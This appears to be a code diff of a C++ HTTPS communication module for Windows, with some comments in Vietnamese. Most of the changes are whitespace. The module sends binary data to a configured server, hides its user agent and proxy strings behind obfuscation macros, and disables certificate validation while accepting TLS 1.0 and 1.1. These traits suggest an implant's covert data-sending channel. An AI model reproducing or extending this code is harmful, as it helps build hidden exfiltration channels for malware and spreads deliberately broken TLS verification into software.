@@ -26,17 +26,19 @@ HttpsComms::~HttpsComms() {
 
 bool HttpsComms::Initialize() {
     // Windows implementation với WinHTTP
-    std::wstring userAgent = std::wstring(OBF_USER_AGENT.begin(), OBF_USER_AGENT.end());
-    
+    std::string userAgentStr = OBF_USER_AGENT;
+    std::wstring userAgent(userAgentStr.begin(), userAgentStr.end());
+
     DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
     LPCWSTR proxyName = WINHTTP_NO_PROXY_NAME;
-    
+
     if (m_config->GetUseProxy()) {
         accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
         std::string proxyStr = OBFUSCATE("http://proxy:8080");
         // Convert to wide string if needed
+        // You'll need to implement proxy configuration
     }
-    
+
     m_hSession = WinHttpOpen(
         userAgent.c_str(),
         accessType,
@@ -63,7 +65,7 @@ bool HttpsComms::Initialize() {
     // Parse server URL
     std::string url = m_config->GetServerUrl();
     std::wstring wUrl(url.begin(), url.end());
-    
+
     URL_COMPONENTS urlComp;
     ZeroMemory(&urlComp, sizeof(urlComp));
     urlComp.dwStructSize = sizeof(urlComp);
@@ -111,7 +113,7 @@ bool HttpsComms::SendData(const std::vector<uint8_t>& data) {
     // Parse server URL để lấy path
     std::string url = m_config->GetServerUrl();
     std::wstring wUrl(url.begin(), url.end());
-    
+
     URL_COMPONENTS urlComp;
     ZeroMemory(&urlComp, sizeof(urlComp));
     urlComp.dwStructSize = sizeof(urlComp);
@@ -149,9 +151,9 @@ bool HttpsComms::SendData(const std::vector<uint8_t>& data) {
     std::string headers = "Content-Type: application/octet-stream\r\n";
     headers += "X-Request-ID: " + utils::StringUtils::GenerateRandomString(16) + "\r\n";
     headers += "Connection: close\r\n";
-    
+
     std::wstring wHeaders(headers.begin(), headers.end());
-    
+
     if (!WinHttpAddRequestHeaders(
         hRequest,
         wHeaders.c_str(),
@@ -208,7 +210,7 @@ bool HttpsComms::SendData(const std::vector<uint8_t>& data) {
 
 bool HttpsComms::ConfigureSslWindows() {
     // Configure SSL options for WinHTTP
-    DWORD securityFlags = 
+    DWORD securityFlags =
         SECURITY_FLAG_IGNORE_UNKNOWN_CA |
         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
@@ -225,8 +227,8 @@ bool HttpsComms::ConfigureSslWindows() {
     }
 
     // Set additional SSL options if needed
-    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1 | 
-                     WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | 
+    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1 |
+                     WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 |
                      WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
 
     if (!WinHttpSetOption(
@@ -252,7 +254,7 @@ void HttpsComms::Cleanup() {
         WinHttpCloseHandle(m_hSession);
         m_hSession = NULL;
     }
-    
+
     LOG_DEBUG("HTTPS communication cleaned up");
 }
 
